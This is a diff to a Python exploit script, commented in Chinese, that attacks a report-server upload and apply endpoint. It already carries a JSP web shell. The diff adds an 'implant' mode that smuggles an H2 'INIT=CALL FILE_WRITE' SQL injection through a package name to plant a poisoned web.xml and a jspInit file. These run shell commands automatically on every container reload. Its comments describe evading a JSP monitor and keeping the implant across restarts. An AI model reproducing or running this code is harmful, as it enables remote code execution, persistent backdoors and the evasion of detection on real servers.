@@ -36,6 +36,34 @@ import zipfile
 JSP = ('<%=Runtime.getRuntime().exec(new String[]'
        '{"/bin/sh","-c",request.getParameter("c")}).waitFor()%>')
 
+IMPLANT_WEBXML = ('<?xml version="1.0" encoding="UTF-8"?>\n'
+'<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">\n'
+'  <servlet>\n'
+'    <servlet-name>xs</servlet-name>\n'
+'    <jsp-file>/WEB-INF/x.env</jsp-file>\n'
+'    <load-on-startup>1</load-on-startup>\n'
+'  </servlet>\n'
+'</web-app>\n')
+
+
+def make_jsp_init(cmd: str) -> str:
+    """jspInit 声明块: 容器重载预编译时自动执行, 零触发请求(命令写入时固化)。"""
+    esc = cmd.replace("\\", "\\\\").replace('"', '\\"')
+    return ('<%! public void jspInit() {\n'
+            '  try { Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",'
+            '"' + esc + '"}).waitFor(); } catch (Throwable t) {}\n'
+            '} %>')
+
+
+def chunk_write_name(content: bytes, target: str) -> str:
+    """任意长度内容: hex 切 20 字符块, 块间 ||/*q*/ —— 注释里的 / 切分路径组件,
+    绕开单组件 255 字节限制(实测组件最长 48B)。"""
+    h = content.hex().upper()
+    chunks = [h[i:i + 20] for i in range(0, len(h), 20)]
+    blob = "||/*q*/".join("X'" + c + "'" for c in chunks)
+    return "x;INIT=CALL FILE_WRITE(" + blob + ", '" + target + "')--"
+
+
 INFO_XML = """<?xml version="1.0" encoding="UTF-8"?>
 <ITEM>
 <structureVersion>2.0</structureVersion>
@@ -113,10 +141,16 @@ def main():
                     choices=["raw", "lower", "comment", "concat", "stealth"])
     ap.add_argument("--jsp-name", default="pwn_fvs.jsp",
                     help="stealth 形态下只需主名(自动拼后缀)")
+    ap.add_argument("--implant", action="store_true",
+                    help="植入模式: 两枪写 WEB-INF/web.xml(投毒)+x.env(jspInit), "
+                         "重载时自动执行命令(零触发请求, 任意大小文件)")
+    ap.add_argument("--wait", type=int, default=180, help="植入模式等待重载的最长秒数")
     ap.add_argument("--write-dir", default="/usr/local/tomcat/webapps/ROOT",
                     help="JSP 写入目录(ROOT=默认context,避开只盯 webroot 的 JSP-Monitor)")
     a = ap.parse_args()
 
+    if a.implant:
+        sys.exit(run_implant(a))
     base = a.target.rstrip("/")
     o = urllib.parse.urlsplit(base)
     origin = f"{o.scheme}://{o.netloc}"
@@ -188,6 +222,64 @@ def main():
         except Exception as e:
             print(f"[4] readback-> 异常 {e}")
     print("[*] 完成。")
+
+def _fire_one(base, name, timeout=120):
+    """单枪: 上传+apply(名称携带注入)"""
+    props_val = name.replace('"', '\\"')
+    props = ('{"name": "%s", "structureVersion": "2.0", "envVersion": "11.0"}' % props_val)
+    qs = ("tplPath=reportlets&resourceType=mfvs&groupPath=%5B%5D&props="
+          + urllib.parse.quote(props, safe=""))
+    b = "----poc114516"
+    body = (f"--{b}\r\n".encode()
+            + b'Content-Disposition: form-data; name="file"; filename="p.mfvs"\r\n'
+            + b"Content-Type: application/octet-stream\r\n\r\n" + build_pack()
+            + f"\r\n--{b}--\r\n".encode())
+    st, data = http_req(urllib.parse.urlsplit(
+        f"{base}/webroot/decision/view/duchamp/reuse/item?{qs}"), "POST", body,
+        f"multipart/form-data; boundary={b}")
+    try:
+        rid = json.loads(data).get("id", "")
+    except Exception:
+        rid = ""
+    if not rid:
+        print("    上传失败:", st, data[:160]); return None
+    q = urllib.parse.urlencode({"tplPath": "reportlets", "id": rid, "path": "pocout"})
+    st2, d2 = http_req(urllib.parse.urlsplit(
+        f"{base}/webroot/decision/view/duchamp/reuse/apply/v2/tpl?{q}"), "POST", b"",
+        timeout=timeout)
+    return f"{st}/{st2}"
+
+
+def run_implant(a):
+    """H2 路线的重载驱动植入: 枪1 写投毒 web.xml, 枪2 写 jspInit x.env(任意大小, 组件切块)"""
+    import time
+    base = a.target.rstrip("/")
+    o = urllib.parse.urlsplit(base)
+    origin = f"{o.scheme}://{o.netloc}"
+    web_inf = "/usr/local/tomcat/webapps/webroot/WEB-INF"
+    readback = f"{origin}/webroot/implant_readback.txt"
+    cmd = a.cmd or (f"(echo PWN-H2-IMPLANT; id; hostname; date) > "
+                    f"/usr/local/tomcat/webapps/webroot/implant_readback.txt 2>&1")
+    print("[*] 植入模式: 枪1 web.xml + 枪2 x.env(jspInit), 目标", web_inf)
+    r1 = _fire_one(base, chunk_write_name(IMPLANT_WEBXML.encode(), web_inf + "/web.xml"))
+    print(f"[1] web.xml -> {r1}")
+    r2 = _fire_one(base, chunk_write_name(make_jsp_init(cmd).encode(), web_inf + "/x.env"))
+    print(f"[2] x.env   -> {r2}")
+    print(f"[3] 等待重载(最长 {a.wait}s)...")
+    deadline = time.time() + a.wait
+    while time.time() < deadline:
+        try:
+            stp, dp = http_req(urllib.parse.urlsplit(readback), timeout=8)
+            if stp == 200 and dp.strip():
+                print("    命令已在重载中执行(零触发请求):")
+                print("-" * 46); print(dp.decode("utf-8", "replace").strip()); print("-" * 46)
+                return 0
+        except Exception:
+            pass
+        time.sleep(6)
+    print("    超时: 未发生重载。已植入——任何重启/重部署时 jspInit 自动执行。")
+    return 2
+
 
 if __name__ == "__main__":
     main()
